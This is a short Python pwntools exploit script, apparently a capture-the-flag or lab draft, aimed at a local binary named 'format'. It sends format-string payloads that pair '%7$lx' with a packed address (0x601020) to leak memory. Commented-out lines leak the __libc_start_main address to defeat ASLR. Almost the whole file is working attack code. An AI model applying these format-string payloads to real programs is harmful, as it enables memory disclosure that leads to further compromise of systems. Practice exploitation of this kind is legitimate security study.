#!/usr/bin/env python
from pwn import *

r = process("./format")
raw_input("@")
#r.sendline("%21$lx>>")
#libc_start_main = int(r.recvuntil('>>')[:-2],16)
#print hex(libc_start_main)


#r.sendline(p64(0x1111111111601020)+'%6$lx')
r.sendline('%7$lx'.ljust(8)+p64(0x601020))
r.interactive()
